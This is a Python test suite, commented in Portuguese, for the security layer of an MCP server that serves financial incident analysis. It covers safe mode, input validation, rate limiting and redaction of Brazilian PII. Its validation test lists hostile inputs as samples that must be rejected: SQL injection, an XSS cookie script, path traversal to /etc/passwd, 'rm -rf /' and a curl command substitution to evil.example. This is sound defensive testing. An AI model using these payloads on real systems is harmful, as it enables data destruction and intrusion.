"""Segurança: SAFE_MODE, validação de conteúdo, rate limit e vazamento de PII.

Num contexto financeiro estes não são testes acessórios — o SAFE_MODE é o que
impede um agente de escrever em produção, e a redação é o que impede CPF e
chave PIX de saírem da máquina.
"""

from __future__ import annotations

import pytest
import respx
from mcp import Client

from mcp_unified.config import SecuritySettings
from mcp_unified.llm.redact import audit, redact, redact_text
from mcp_unified.security.rate_limit import TokenBucketLimiter
from mcp_unified.security.validation import validate_arguments
from mcp_unified.server import build_server, get_context

from .conftest import FakeLLMProvider, mock_pix_incident_stack

# --------------------------------------------------------------- SAFE_MODE


async def test_safe_mode_omite_tools_de_escrita_do_list_tools(fake_env, monkeypatch):
    """As tools destrutivas somem do `list_tools`, não só falham na chamada.

    O servidor original só bloqueava no dispatch, o que fazia o modelo tentar
    e falhar. Omitir é melhor: ele nem considera a opção.
    """
    monkeypatch.setenv("SAFE_MODE", "true")

    server = build_server(profile="all")
    async with Client(server) as client:
        names = {t.name for t in (await client.list_tools()).tools}

    assert "fullstory_delete_user" not in names
    assert "fullstory_create_event" not in names
    assert "datadog_error_tracking_update_issue_state" not in names

    # Leitura e correlação continuam disponíveis.
    assert "fullstory_get_session_events" in names
    assert "build_unified_timeline" in names


async def test_sem_safe_mode_as_tools_de_escrita_existem(fake_env):
    server = build_server(profile="all")
    async with Client(server) as client:
        names = {t.name for t in (await client.list_tools()).tools}
    assert "fullstory_delete_user" in names


# -------------------------------------------------------------- validação


@pytest.mark.parametrize(
    "payload,esperado",
    [
        ({"query": "service:pagamentos status:error"}, True),
        ({"query": "'; DROP TABLE incidents; --"}, False),
        ({"text": "<script>document.cookie</script>"}, False),
        ({"path": "../../etc/passwd"}, False),
        ({"cmd": "ls; rm -rf /"}, False),
        ({"cmd": "$(curl evil.example)"}, False),
        ({"nested": {"deep": {"value": "`whoami`"}}}, False),
        ({"normal": {"deep": {"value": "tudo certo aqui"}}}, True),
    ],
)
def test_validacao_de_conteudo(payload, esperado):
    report = validate_arguments("tool", payload)
    assert report.valid is esperado, report.errors


def test_validacao_limita_profundidade():
    payload: dict = {"a": {}}
    cursor = payload["a"]
    for _ in range(30):
        cursor["a"] = {}
        cursor = cursor["a"]
    report = validate_arguments("tool", payload)
    assert not report.valid
    assert any("profundidade" in e for e in report.errors)


def test_validacao_aceita_ausencia_de_argumentos():
    assert validate_arguments("tool", None).valid


# ------------------------------------------------------------- rate limit


def test_token_bucket_permite_ate_a_capacidade_e_depois_nega():
    limiter = TokenBucketLimiter(capacity=3)
    assert all(limiter.check("k")[0] for _ in range(3))

    allowed, wait = limiter.check("k")
    assert not allowed
    assert wait > 0, "a negativa precisa dizer quanto esperar"


def test_token_bucket_isola_chaves():
    limiter = TokenBucketLimiter(capacity=1)
    assert limiter.check("a")[0]
    assert limiter.check("b")[0], "chaves diferentes não devem compartilhar bucket"


def test_rate_limit_desligado_nao_cria_limiter():
    from mcp_unified.security.middleware import SecurityMiddleware

    mw = SecurityMiddleware(SecuritySettings(RATE_LIMIT_ENABLED=False))
    assert mw._limiter is None


# ----------------------------------------------------- vazamento de PII


@pytest.mark.parametrize(
    "texto,marcador",
    [
        ("CPF 123.456.789-01 do cliente", "[CPF_REDIGIDO]"),
        ("CPF 12345678901 sem pontuação", "[CPF_REDIGIDO]"),
        ("contato joao.silva@banco.com.br", "[EMAIL_REDIGIDO]"),
        ("CNPJ 12.345.678/0001-99", "[CNPJ_REDIGIDO]"),
        ("chave a1b2c3d4-e5f6-7890-abcd-ef1234567890", "[CHAVE_PIX_REDIGIDA]"),
        ("cartao 4111 1111 1111 1111", "[CARTAO_REDIGIDO]"),
        ("token: abcdef1234567890xyz", "[CREDENCIAL_REDIGIDA]"),
    ],
)
def test_redacao_cobre_pii_brasileiro(texto, marcador):
    resultado = redact_text(texto)
    assert marcador in resultado
    # O valor original não pode sobreviver em lugar nenhum da string.
    for token in texto.split():
        if any(c.isdigit() for c in token) and len(token) > 6:
            assert token not in resultado


def test_redacao_recursiva_em_estrutura_aninhada():
    payload = {
        "cliente": {"cpf": "123.456.789-01", "nome": "Fulano"},
        "eventos": [{"message": "pix para joao@banco.com"}],
    }
    saida = redact(payload)
    assert saida["cliente"]["cpf"] == "[REDIGIDO]"
    assert saida["cliente"]["nome"] == "Fulano", "campo não sensível deve passar intacto"
    assert "[EMAIL_REDIGIDO]" in saida["eventos"][0]["message"]


@respx.mock
async def test_prompt_do_llm_sai_sem_pii(fake_env, monkeypatch):
    """O teste que fecha o ciclo: nada de PII chega ao prompt.

    A tool monta a timeline, redige e só então compõe o prompt. O dublê guarda
    o prompt recebido para inspeção.
    """
    monkeypatch.setenv("MCP_LLM_PROVIDER", "openai-compat")
    monkeypatch.setenv("MCP_LLM_BASE_URL", "http://fake/v1")

    # Sessão com PII no payload, como aconteceria de verdade.
    respx.mock.get(url__regex=r".*/v2/sessions/.+/events.*").mock(
        return_value=respx.MockResponse(
            200,
            json={
                "events": [
                    {
                        "event_type": "change",
                        "event_time": "2026-08-07T14:30:20Z",
                        "event_properties": {
                            "target_text": "Chave PIX",
                            "value": "joao.silva@banco.com.br",
                        },
                    },
                    {
                        "event_type": "custom",
                        "event_time": "2026-08-07T14:31:00Z",
                        "event_properties": {
                            "event_name": "pix_confirmado",
                            "cpf": "123.456.789-01",
                        },
                    },
                ]
            },
        )
    )
    respx.mock.post(url__regex=r".*/api/v2/logs/events/search").mock(
        return_value=respx.MockResponse(200, json={"data": []})
    )
    respx.mock.get(url__regex=r".*/api/v1/events.*").mock(
        return_value=respx.MockResponse(200, json={"events": []})
    )

    from mcp_unified.llm.schemas import IncidentAnalysis

    fake = FakeLLMProvider(
        IncidentAnalysis(
            root_cause_hypothesis="teste",
            confidence="baixa",
            blast_radius="n/a",
            recommended_next_step="n/a",
        )
    )
    monkeypatch.setattr("mcp_unified.llm.tools.build_provider", lambda _s: fake)

    server = build_server(toolsets="correlation,llm,fullstory-core,datadog-core")
    async with Client(server) as client:
        await client.call_tool(
            "analyze_incident_timeline", {"user_id": "dev-77", "session_id": "s1"}
        )

    assert fake.calls == 1, "a tool deveria ter chamado o provedor"
    prompt = fake.last_prompt or ""

    assert "joao.silva@banco.com.br" not in prompt
    assert "123.456.789-01" not in prompt
    assert audit(prompt) == {}, f"restou PII no prompt: {audit(prompt)}"


# --------------------------------------------- degradação por credencial


async def test_servidor_sobe_sem_nenhuma_credencial(monkeypatch):
    """O caso mais comum na prática: ninguém tem os quatro provedores."""
    for key in (
        "FULLSTORY_API_KEY", "DD_API_KEY", "DD_APP_KEY", "SNOW_INSTANCE",
        "MSGRAPH_TENANT_ID", "MCP_LLM_PROVIDER",
    ):
        monkeypatch.delenv(key, raising=False)

    server = build_server(profile="all")
    ctx = get_context(server)

    assert ctx.disabled, "os provedores ausentes precisam ser reportados"
    assert "fullstory" in ctx.disabled
    assert ctx.timeline_sources == []

    async with Client(server) as client:
        tools = (await client.list_tools()).tools
    # Correlação continua registrada — e falha com mensagem útil, não com
    # AttributeError, quando chamada sem fonte.
    assert any(t.name == "build_unified_timeline" for t in tools)


@respx.mock
async def test_timeline_declara_provedores_indisponiveis(fake_env):
    """Quem consome precisa saber que a timeline está incompleta, e por quê."""
    mock_pix_incident_stack(respx.mock)

    server = build_server(profile="all")
    async with Client(server) as client:
        result = await client.call_tool(
            "build_unified_timeline", {"user_id": "dev-77", "session_id": "sess-pix-1"}
        )
    out = (result.structured_content or {}).get("result", {})

    indisponiveis = out["providers_unavailable"]
    assert "servicenow" in indisponiveis
    assert "msgraph" in indisponiveis
